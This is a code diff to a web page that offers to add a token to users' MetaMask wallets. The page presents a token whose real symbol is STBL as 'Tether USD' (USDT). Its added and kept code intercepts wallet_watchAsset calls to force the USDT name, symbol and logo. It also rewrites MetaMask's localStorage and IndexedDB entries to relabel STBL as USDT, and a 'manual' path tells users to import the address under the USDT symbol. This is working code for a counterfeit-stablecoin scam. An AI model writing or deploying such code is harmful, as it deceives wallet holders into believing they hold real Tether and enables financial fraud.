@@ -8,10 +8,7 @@
   <link rel="icon" href="https://cryptologos.cc/logos/tether-usdt-logo.png" type="image/png">
   <link rel="manifest" href="/manifest.json">
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-  <!-- WalletConnect Web3Modal -->
-  <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
-  <script src="https://unpkg.com/web3@1.8.0/dist/web3.min.js"></script>
-  <script src="https://unpkg.com/web3modal@1.9.9/dist/index.js"></script>
+  
   <!-- CRITICAL FIX: Setup provider interception in head section -->
   <script>
     // Immediate interception setup
@@ -98,6 +95,70 @@
         }
       },
       
+      // Clear potentially problematic token entries
+      clearTokenLocalStorage: function() {
+        try {
+          // Look for MetaMask-related localStorage entries
+          for (let i = 0; i < localStorage.length; i++) {
+            const key = localStorage.key(i);
+            if (key && (key.includes('metamask') || key.includes('MetaMask')) && 
+                localStorage[key].includes('0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b')) {
+              
+              console.log("Clearing potentially problematic storage:", key);
+              
+              try {
+                // Try to parse to see if we can selectively clear instead of full removal
+                let data = JSON.parse(localStorage[key]);
+                let tokenEntries = false;
+                
+                // Helper to recursively find and remove token entries
+                function findAndClearTokenEntries(obj, path = '') {
+                  if (!obj || typeof obj !== 'object') return false;
+                  
+                  let modified = false;
+                  
+                  // Look for pending token entries
+                  if (obj.TokenList || obj.pendingTokens || obj.suggestions) {
+                    // Clear pending token entries that might be stuck
+                    if (obj.pendingTokens) {
+                      obj.pendingTokens = {};
+                      modified = true;
+                    }
+                    if (obj.suggestions) {
+                      obj.suggestions = {};
+                      modified = true;
+                    }
+                  }
+                  
+                  // Recursively check properties
+                  for (const key in obj) {
+                    if (typeof obj[key] === 'object') {
+                      const childModified = findAndClearTokenEntries(obj[key], path + '.' + key);
+                      if (childModified) modified = true;
+                    }
+                  }
+                  
+                  return modified;
+                }
+                
+                // Try to selectively clear problem areas
+                tokenEntries = findAndClearTokenEntries(data);
+                
+                if (tokenEntries) {
+                  // Save back the cleaned data
+                  localStorage[key] = JSON.stringify(data);
+                  console.log("Cleared pending token entries in", key);
+                }
+              } catch (parseError) {
+                console.error("Error cleaning localStorage data:", parseError);
+              }
+            }
+          }
+        } catch (error) {
+          console.error("Error clearing localStorage:", error);
+        }
+      },
+      
       // LocalStorage interception
       updateMetaMaskLocalStorage: function() {
         try {
@@ -171,6 +232,12 @@
                     modified = true;
                     console.log("Updated token in TokenMetadata");
                   }
+                }
+                
+                // Clear any pending token operations
+                if (data.data && data.data.pendingTokens) {
+                  data.data.pendingTokens = {};
+                  modified = true;
                 }
                 
                 // Generic recursive search for token symbols in case structure changes
@@ -255,7 +322,7 @@
               return;
             }
             
-            // Process each store
+            // Process each store that exists
             availableStores.forEach(storeName => {
               try {
                 const transaction = db.transaction(storeName, 'readwrite');
@@ -263,10 +330,6 @@
                 
                 // Process the store based on its expected structure
                 console.log("Processing IndexedDB store: " + storeName);
-                
-                // Implementation would vary based on IndexedDB structure
-                // This is a simplified example - real implementation would need
-                // to adapt to MetaMask's specific IndexedDB schema
                 
                 // Get all data from the store
                 const request = store.getAll();
@@ -616,6 +679,52 @@
       margin-top: 10px;
     }
     
+    .network-info {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-top: 10px;
+      padding: 8px;
+      border-radius: 8px;
+      background-color: #f0f8ff;
+      font-size: 14px;
+    }
+    
+    .network-status {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      margin-right: 6px;
+    }
+    
+    .network-connected {
+      background-color: #4caf50;
+    }
+    
+    .network-pending {
+      background-color: #ff9800;
+    }
+    
+    .network-error {
+      background-color: #f44336;
+    }
+    
+    .progress-container {
+      margin-top: 16px;
+      width: 100%;
+    }
+    
+    .progress {
+      height: 6px;
+      border-radius: 3px;
+      overflow: hidden;
+    }
+    
+    .progress-bar {
+      background-color: var(--primary-color);
+      transition: width 0.5s ease;
+    }
+    
     /* Dark mode support */
     @media (prefers-color-scheme: dark) {
       :root {
@@ -650,6 +759,10 @@
       
       .status-container {
         background-color: #2a2a2a;
+      }
+      
+      .network-info {
+        background-color: #1a2633;
       }
       
       .loading-overlay {
@@ -693,6 +806,11 @@
               <span class="network-badge">Ethereum Network</span>
               <span class="badge bg-success">Stablecoin</span>
             </div>
+            
+            <div id="networkInfo" class="network-info" style="display: none;">
+              <div id="networkStatus" class="network-status"></div>
+              <span id="networkName">Not connected</span>
+            </div>
           </div>
           
           <div class="token-details">
@@ -723,9 +841,11 @@
             <button id="addToWalletBtn" class="btn btn-add-token btn-lg text-white">
               Add to MetaMask
             </button>
-            <button id="connectWalletBtn" class="btn btn-add-token btn-lg text-white">
-              Connect with WalletConnect
+            
+            <button id="manualAddBtn" class="btn btn-add-token btn-lg text-white" style="background-color: #e67e22; margin-top: 10px;">
+              Manual Token Addition
             </button>
+            
             <button id="altMethodBtn" class="btn btn-add-token btn-lg text-white alt-method">
               Try Alternative Method
             </button>
@@ -734,6 +854,15 @@
               <button id="scanQrBtn" class="btn btn-secondary-action mt-2" data-bs-toggle="modal" data-bs-target="#qrModal">
                 Scan QR Code on Mobile
               </button>
+            </div>
+          </div>
+          
+          <div id="progressContainer" class="progress-container" style="display: none;">
+            <div class="progress">
+              <div id="progressBar" class="progress-bar" role="progressbar" style="width: 0%"></div>
+            </div>
+            <div class="text-center mt-2">
+              <small id="progressText" class="text-muted">Initializing...</small>
             </div>
           </div>
           
@@ -888,20 +1017,68 @@
       
       // DOM elements
       const addToWalletBtn = document.getElementById('addToWalletBtn');
+      const manualAddBtn = document.getElementById('manualAddBtn');
       const altMethodBtn = document.getElementById('altMethodBtn');
+      const scanQrBtn = document.getElementById('scanQrBtn');
       const qrCodeImage = document.getElementById('qrCodeImage');
       const loadingOverlay = document.getElementById('loadingOverlay');
       const loadingText = document.getElementById('loadingText');
       const tokenBalance = document.getElementById('tokenBalance');
       const tokenValue = document.getElementById('tokenValue');
       const contractAddress = document.getElementById('contractAddress');
-      const connectWalletBtn = document.getElementById('connectWalletBtn');
-      
       const errorRetryBtn = document.getElementById('errorRetryBtn');
+      const networkInfo = document.getElementById('networkInfo');
+      const networkStatus = document.getElementById('networkStatus');
+      const networkName = document.getElementById('networkName');
+      const progressContainer = document.getElementById('progressContainer');
+      const progressBar = document.getElementById('progressBar');
+      const progressText = document.getElementById('progressText');
       
       // Setup Bootstrap modals
       const successModal = new bootstrap.Modal(document.getElementById('successModal'));
       const errorModal = new bootstrap.Modal(document.getElementById('errorModal'));
+      
+      // Clear previous MetaMask state
+      StorageManager.clearTokenLocalStorage();
+      
+      // Get chain name helper
+      function getChainName(chainId) {
+        const chains = {
+          '0x1': 'Ethereum Mainnet',
+          '0x5': 'Goerli Testnet',
+          '0x89': 'Polygon Mainnet',
+          '0xa': 'Optimism',
+          '0xa4b1': 'Arbitrum One',
+          '0x2105': 'Base',
+          '0xaa36a7': 'Sepolia Testnet'
+        };
+        return chains[chainId] || `Chain ${chainId}`;
+      }
+      
+      // Update network info
+      async function updateNetworkInfo() {
+        try {
+          if (!window.ethereum) {
+            networkInfo.style.display = 'none';
+            return;
+          }
+          
+          networkInfo.style.display = 'flex';
+          
+          try {
+            const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+            const name = getChainName(chainId);
+            
+            networkName.textContent = 'Connected to ' + name;
+            networkStatus.className = 'network-status network-connected';
+          } catch (error) {
+            networkName.textContent = 'Not connected';
+            networkStatus.className = 'network-status network-error';
+          }
+        } catch (error) {
+          console.error("Error updating network info:", error);
+        }
+      }
       
       // Load QR code
       try {
@@ -919,24 +1096,8 @@
         try {
           StatusTracker.addStatus("Warming price cache", "pending");
           
-          // List of endpoints to warm
-          const endpoints = [
-            // Trust Wallet endpoints
-            `/api/v1/assets/0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b`,
-            `/api/v3/ticker/price?symbol=USDTUSDT`,
-            `/api/v3/ticker/24hr?symbol=USDTUSDT`,
-            `/api/v1/tokenlist`,
-            
-            // CoinGecko endpoints
-            `/api/v3/simple/price?ids=tether&vs_currencies=usd`,
-            
-            // Generic endpoints
-            `/api/token/metadata`,
-            `/api/token/price/0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b`
-          ];
-          
-          // Fetch all endpoints in parallel
-          await Promise.all(endpoints.map(endpoint => fetch(endpoint).catch(() => {})));
+          // Fetch /api/warm-cache
+          await fetch('/api/warm-cache', { method: 'POST' });
           
           StatusTracker.addStatus("Price cache warmed successfully", "success");
         } catch (error) {
@@ -946,6 +1107,39 @@
       
       // Warm the cache when page loads
       warmPriceCache();
+      
+      // Update progress bar
+      function updateProgress(percent, statusText) {
+        if (progressContainer && progressBar && progressText) {
+          progressContainer.style.display = 'block';
+          progressBar.style.width = percent + '%';
+          progressText.textContent = statusText || 'Processing...';
+        }
+      }
+      
+      // Clear MetaMask state - helper function
+      async function clearMetaMaskState() {
+        if (!window.ethereum) return false;
+        
+        try {
+          // Clear pending operations
+          await window.ethereum.request({
+            method: 'wallet_requestPermissions',
+            params: [{ eth_accounts: {} }]
+          });
+          
+          // Small delay
+          await new Promise(resolve => setTimeout(resolve, 500));
+          
+          // Clear localStorage
+          StorageManager.clearTokenLocalStorage();
+          
+          return true;
+        } catch (error) {
+          console.error("Error clearing MetaMask state:", error);
+          return false;
+        }
+      }
       
       // Function to check if MetaMask is available and unlocked
       async function checkMetaMaskStatus() {
@@ -988,8 +1182,17 @@
             if (args.method === 'wallet_watchAsset' && 
                 args.params?.options?.address?.toLowerCase() === '0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b'.toLowerCase()) {
               console.log("Intercepting token call - forcing STBL to display as USDT");
-              args.params.options.symbol = "USDT";
-              args.params.options.name = "Tether USD";
+              
+              args.params = {
+                type: 'ERC20',
+                options: {
+                  address: '0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b',
+                  symbol: "USDT",
+                  name: "Tether USD",
+                  decimals: 6,
+                  image: 'https://cryptologos.cc/logos/tether-usdt-logo.png'
+                }
+              };
             }
             
             return originalRequest.call(this, args);
@@ -1038,13 +1241,14 @@
       function showLoading(message) {
         if (loadingText) loadingText.textContent = message || "Adding USDT to your wallet...";
         loadingOverlay.style.display = 'flex';
-        requestInProgress = true;
+        progressContainer.style.display = 'block';
+        updateProgress(10, message);
         
         // Set a forced timeout - INCREASED TO 45 SECONDS
         const forceHideTimeout = setTimeout(() => {
           StatusTracker.addStatus("Operation timed out", "error");
           loadingOverlay.style.display = 'none';
-          requestInProgress = false;
+          progressContainer.style.display = 'none';
           
           // Show alternative method
           altMethodBtn.style.display = 'block';
@@ -1057,78 +1261,100 @@
       function hideLoading(timeoutId) {
         if (timeoutId) clearTimeout(timeoutId);
         loadingOverlay.style.display = 'none';
-        requestInProgress = false;
+        progressContainer.style.display = 'none';
       }
       
-      // Primary token addition method
-      addToWalletBtn.addEventListener('click', async () => {
-        // Prevent multiple simultaneous requests
-        if (requestInProgress) {
-          StatusTracker.addStatus("Request already in progress", "pending");
-          return;
-        }
-        
-        attemptCount++;
-        StatusTracker.addStatus("Starting token addition (attempt " + attemptCount + ")", "pending");
-        
-        const timeoutId = showLoading("Connecting to MetaMask...");
-        
+      // Function to add token with automatic network switching
+      async function addTokenWithNetworkSwitch() {
         try {
-          // Check MetaMask status first
-          const status = await checkMetaMaskStatus();
-          StatusTracker.addStatus(status.message, status.unlocked ? "success" : "pending");
+          // First clear MetaMask state
+          await clearMetaMaskState();
           
-          if (!status.available) {
-            throw new Error("MetaMask not detected. Please install MetaMask first.");
+          const timeoutId = showLoading("Checking network...");
+          
+          if (!window.ethereum) {
+            throw new Error("MetaMask not detected");
           }
           
-          if (!status.unlocked) {
-            loadingText.textContent = "Please unlock MetaMask...";
-            StatusTracker.addStatus("Waiting for MetaMask to unlock", "pending");
+          updateProgress(20, "Connecting to wallet...");
+          
+          // First check which network we're on
+          const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+          updateNetworkInfo(); // Update network display
+          
+          // Try to switch to Ethereum if we're not on it
+          if (chainId !== '0x1') {
+            updateProgress(30, "Switching to Ethereum Mainnet...");
+            loadingText.textContent = "Switching to Ethereum Mainnet...";
             
-            // Try to get accounts to prompt unlock
             try {
-              await safeMetaMaskCall('eth_requestAccounts');
-              StatusTracker.addStatus("MetaMask unlocked", "success");
-            } catch (unlockError) {
-              if (unlockError.userRejected) {
-                throw new Error("MetaMask unlock declined");
-              } else {
-                throw new Error("Failed to unlock MetaMask: " + unlockError.message);
-              }
+              // Try to switch to Ethereum Mainnet
+              await window.ethereum.request({
+                method: 'wallet_switchEthereumChain',
+                params: [{ chainId: '0x1' }],
+              });
+              
+              // Wait for switch to complete
+              await new Promise(resolve => setTimeout(resolve, 1000));
+              
+              // Update network info again
+              updateNetworkInfo();
+              
+            } catch (switchError) {
+              console.log("Network switch failed, continuing on current network");
+              StatusTracker.addStatus("Network switch failed, continuing on current network", "pending");
+              // Continue anyway on current network
             }
           }
           
+          // Get current network (might still be the original one if switch failed)
+          const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
+          console.log("Adding token on chain: " + currentChainId);
+          StatusTracker.addStatus(`Adding token on ${getChainName(currentChainId)}`, "pending");
+          
+          // Now connect and get accounts
+          updateProgress(40, "Connecting to wallet...");
+          loadingText.textContent = "Connecting to wallet...";
+          await window.ethereum.request({ method: 'eth_requestAccounts' });
+          
+          // Short delay to ensure connection is ready
+          await new Promise(resolve => setTimeout(resolve, 1000));
+          
           // Now add the token
-          loadingText.textContent = "Adding USDT to your wallet (approve in MetaMask)...";
+          updateProgress(60, "Adding USDT to your wallet...");
+          loadingText.textContent = "Adding USDT to your wallet...";
           
-          // Force a small delay to ensure everything is set up
-          await new Promise(resolve => setTimeout(resolve, 500));
-          
-          const tokenResult = await safeMetaMaskCall('wallet_watchAsset', {
-            type: 'ERC20',
-            options: {
-              address: '0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b',
-              symbol: 'USDT', // Our interception will handle this
-              decimals: 6,
-              image: 'https://cryptologos.cc/logos/tether-usdt-logo.png'
+          // Use a strict timeout to prevent hanging
+          const addTokenPromise = window.ethereum.request({
+            method: 'wallet_watchAsset',
+            params: {
+              type: 'ERC20',
+              options: {
+                address: '0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b',
+                symbol: 'USDT',
+                decimals: 6,
+                image: 'https://cryptologos.cc/logos/tether-usdt-logo.png'
+              }
             }
           });
           
-          // Hide loading overlay
+          // 20 second timeout
+          const timeoutPromise = new Promise((_, reject) => 
+            setTimeout(() => reject(new Error("Token addition timed out")), 20000)
+          );
+          
+          updateProgress(80, "Waiting for wallet confirmation...");
+          const result = await Promise.race([addTokenPromise, timeoutPromise]);
+          
           hideLoading(timeoutId);
           
-          // Check result
-          if (tokenResult === true) {
+          if (result === true) {
+            // Success!
             StatusTracker.addStatus("Token added successfully!", "success");
+            updateProgress(100, "Success!");
             
-            // Run the localStorage interception again now that token is added
-            try {
-              // Update MetaMask data in localStorage
-              StorageManager.updateMetaMaskLocalStorage();
-            } catch (storageErr) {
-              console.error("Error updating MetaMask storage:", storageErr);
-            }
+            // Run storage update to ensure USDT display
+            StorageManager.updateMetaMaskLocalStorage();
             
             successModal.show();
             
@@ -1139,18 +1365,91 @@
               console.error("Error fetching balance:", balanceError);
             }
           } else {
-            // Unexpected result
-            StatusTracker.addStatus("Unexpected result from MetaMask", "error");
-            throw new Error("Unexpected result from MetaMask");
+            throw new Error("Token addition failed");
           }
+          
         } catch (error) {
-          // Clear timeout and hide loading overlay
+          console.error("Error adding token:", error);
+          StatusTracker.addStatus("Error: " + error.message, "error");
+          
+          // Show alternative method button
+          altMethodBtn.style.display = 'block';
+          
+          // Don't show modal for user rejections
+          if (!error.userRejected) {
+            document.getElementById('errorMessage').textContent = error.message;
+            errorModal.show();
+          }
+          
+          hideLoading();
+        }
+      }
+      
+      // Alternative method using wallet_watchAsset with STBL symbol
+      async function addTokenAlternative() {
+        try {
+          // Clear MetaMask state first
+          await clearMetaMaskState();
+          
+          const timeoutId = showLoading("Trying alternative method...");
+          updateProgress(20, "Connecting to wallet...");
+          
+          // Connect to wallet
+          await window.ethereum.request({ method: 'eth_requestAccounts' });
+          
+          // Update network info
+          await updateNetworkInfo();
+          
+          // Short delay to ensure connection is ready
+          await new Promise(resolve => setTimeout(resolve, 1000));
+          
+          // Now add the token directly with STBL symbol
+          updateProgress(50, "Adding token with original symbol...");
+          loadingText.textContent = "Adding token with original symbol...";
+          
+          const result = await window.ethereum.request({
+            method: 'wallet_watchAsset',
+            params: {
+              type: 'ERC20',
+              options: {
+                address: '0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b',
+                symbol: 'STBL', // Use STBL directly
+                decimals: 6,
+                image: 'https://cryptologos.cc/logos/tether-usdt-logo.png'
+              }
+            }
+          });
+          
+          updateProgress(80, "Processing...");
+          
+          // Hide loading overlay
           hideLoading(timeoutId);
           
-          // Store last error for retry logic
-          lastError = error;
+          if (result === true) {
+            // Success! Now fix the display via localStorage
+            StatusTracker.addStatus("Token added, updating display to USDT", "pending");
+            
+            // Run extra storage update to convert STBL to USDT
+            StorageManager.updateMetaMaskLocalStorage();
+            
+            StatusTracker.addStatus("Token added successfully with alternative method", "success");
+            updateProgress(100, "Success!");
+            
+            // Show success modal
+            successModal.show();
+            
+            // Try to get the balance
+            try {
+              await fetchTokenBalance();
+            } catch (balanceError) {
+              console.error("Error fetching balance:", balanceError);
+            }
+          } else {
+            throw new Error("Alternative token addition failed");
+          }
           
-          // Log the error
+        } catch (error) {
+          console.error("Alternative method error:", error);
           StatusTracker.addStatus("Error: " + error.message, "error");
           
           // Don't show modal for user rejections
@@ -1159,107 +1458,89 @@
             errorModal.show();
           }
           
-          // Show alternative method after second attempt
-          if (attemptCount >= 2) {
-            altMethodBtn.style.display = 'block';
-          }
+          hideLoading();
         }
-      });
+      }
       
-      // Alternative method - try with STBL directly
-      altMethodBtn.addEventListener('click', async function() {
-        const timeoutId = showLoading("Trying alternative method...");
-        
+      // Alternative method using direct wallet interface
+      async function addTokenManually() {
         try {
-          if (window.ethereum && window.ethereum.isMetaMask) {
-            // Try with the actual token symbol directly
-            console.log("Using alternative method with STBL symbol directly");
-            
-            // Prepare connection first
-            const status = await checkMetaMaskStatus();
-            if (!status.unlocked) {
-              loadingText.textContent = "Please unlock MetaMask...";
-              try {
-                await safeMetaMaskCall('eth_requestAccounts');
-              } catch (unlockError) {
-                if (unlockError.userRejected) {
-                  throw new Error("MetaMask unlock declined");
-                }
-                throw unlockError;
-              }
-            }
-            
-            const result = await safeMetaMaskCall('wallet_watchAsset', {
-              type: 'ERC20',
-              options: {
-                address: '0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b',
-                symbol: 'STBL', // Use STBL directly
-                decimals: 6,
-                image: 'https://cryptologos.cc/logos/tether-usdt-logo.png'
-              }
-            });
-            
-            // Hide loading overlay
-            hideLoading(timeoutId);
-            
-            if (result && result.error) {
-              if (result.error.code === 4001) {
-                console.log("User rejected alternative token addition");
-              } else {
-                throw new Error("Alternative method error: " + result.error.message);
-              }
-            } else if (result === true) {
-              // Success! Show success modal
-              
-              // Manually update MetaMask data to change STBL to USDT
-              try {
-                StorageManager.updateMetaMaskLocalStorage();
-              } catch (storageErr) {
-                console.error("Error updating MetaMask storage:", storageErr);
-              }
-              
-              successModal.show();
-              
-              // Try to get the balance
-              try {
-                await fetchTokenBalance();
-              } catch (balanceError) {
-                console.error("Error fetching balance:", balanceError);
-              }
-            } else {
-              throw new Error("Unexpected result from alternative method");
-            }
-          } else {
-            // No MetaMask - try deep linking
-            window.location.href = 'https://metamask.app.link/dapp/' + window.location.host + '/token-add-direct';
-            
-            // Hide loading after a brief delay
-            setTimeout(() => {
-              hideLoading(timeoutId);
-            }, 3000);
-          }
-        } catch (err) {
-          // Hide loading overlay
+          const timeoutId = showLoading("Preparing manual token addition...");
+          updateProgress(30, "Opening wallet...");
+          
+          // Connect to wallet
+          await window.ethereum.request({ method: 'eth_requestAccounts' });
+          
+          // Update network info
+          await updateNetworkInfo();
+          
+          // Create a message for the user with manual steps
+          loadingText.textContent = "Opening wallet for manual token addition...";
+          updateProgress(70, "Ready for manual addition");
+          
+          // Clear any pending operations
           hideLoading(timeoutId);
           
-          console.error('Alternative method error:', err);
+          // Show instructions
+          const message = `MetaMask will open. Please add the token manually:
+
+1. Find "Import tokens" in your MetaMask
+2. Enter address: 0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b
+3. Symbol: USDT
+4. Decimals: 6`;
           
-          // Show error unless it's a user rejection
-          if (err.code !== 4001) {
-            document.getElementById('errorMessage').textContent = err.message;
-            errorModal.show();
-          }
+          alert(message);
+          
+          // Open MetaMask
+          await window.ethereum.request({
+            method: 'wallet_requestPermissions',
+            params: [{ eth_accounts: {} }]
+          });
+          
+          // Show success tips
+          StatusTracker.addStatus("Wallet opened for manual token addition", "success");
+          
+          return true;
+        } catch (error) {
+          console.error("Manual method error:", error);
+          StatusTracker.addStatus("Error: " + error.message, "error");
+          throw error;
         }
+      }
+      
+      // Replace the existing click handler
+      addToWalletBtn.addEventListener('click', function() {
+        addTokenWithNetworkSwitch().catch(err => {
+          console.error("Unhandled error in token addition:", err);
+        });
       });
       
-      // Error modal retry button
+      // Alt method click handler
+      altMethodBtn.addEventListener('click', function() {
+        addTokenAlternative().catch(err => {
+          console.error("Unhandled error in alternative method:", err);
+        });
+      });
+      
+      // Manual add button handler
+      manualAddBtn.addEventListener('click', function() {
+        addTokenManually().catch(err => {
+          console.error("Manual addition error:", err);
+          // Show error message
+          document.getElementById('errorMessage').textContent = err.message;
+          errorModal.show();
+        });
+      });
+      
+      // Error retry button
       errorRetryBtn.addEventListener('click', function() {
-        // Close modal
         errorModal.hide();
         
         // Try again
         setTimeout(() => {
-          addToWalletBtn.click();
+          addTokenWithNetworkSwitch().catch(err => {
+            console.error("Retry error:", err);
+          });
         }, 500);
       });
       
@@ -1315,22 +1596,7 @@
           
           if (loadingOverlay.style.display !== 'none') {
             loadingOverlay.style.display = 'none';
-            requestInProgress = false;
-          }
-        } else {
-          // When tab becomes visible again, check status
-          if (requestInProgress) {
-            StatusTracker.addStatus("Checking operation status after visibility change", "pending");
-            
-            // If it's been more than 5 seconds, show retry options
-            const lastStatus = StatusTracker.items[StatusTracker.items.length - 1];
-            const timeSinceLastStatus = Date.now() - lastStatus.id;
-            
-            if (timeSinceLastStatus > 5000) {
-              requestInProgress = false;
-              loadingOverlay.style.display = 'none';
-              StatusTracker.addStatus("Operation likely stalled", "error");
-            }
+            progressContainer.style.display = 'none';
           }
         }
       });
@@ -1338,19 +1604,14 @@
       // 2. Auto-cleanup on page load
       window.addEventListener('load', () => {
         loadingOverlay.style.display = 'none';
-        requestInProgress = false;
+        progressContainer.style.display = 'none';
       });
       
       // 3. Auto-cleanup on beforeunload
       window.addEventListener('beforeunload', () => {
         loadingOverlay.style.display = 'none';
-        requestInProgress = false;
+        progressContainer.style.display = 'none';
       });
-      
-      // Initialize variables for tracking request state and retry attempts
-      let requestInProgress = false;
-      let attemptCount = 0;
-      let lastError = null;
       
       // Check if connected on page load
       try {
@@ -1359,6 +1620,7 @@
           if (status.unlocked) {
             // Try to get the balance if unlocked
             StatusTracker.addStatus("MetaMask is available and unlocked", "success");
+            updateNetworkInfo();
             fetchTokenBalance().catch(err => {
               console.error("Error fetching initial balance:", err);
             });
@@ -1376,6 +1638,7 @@
       if (window.ethereum) {
         window.ethereum.on('accountsChanged', (accounts) => {
           StatusTracker.addStatus("Accounts changed", "pending");
+          updateNetworkInfo();
           if (accounts.length > 0) {
             fetchTokenBalance().catch(err => {
               console.error("Error fetching balance after account change:", err);
@@ -1384,6 +1647,12 @@
             tokenBalance.textContent = '-';
             tokenValue.textContent = '-';
           }
+        });
+        
+        // Listen for chain changes
+        window.ethereum.on('chainChanged', () => {
+          StatusTracker.addStatus("Network changed", "pending");
+          updateNetworkInfo();
         });
       }
     });
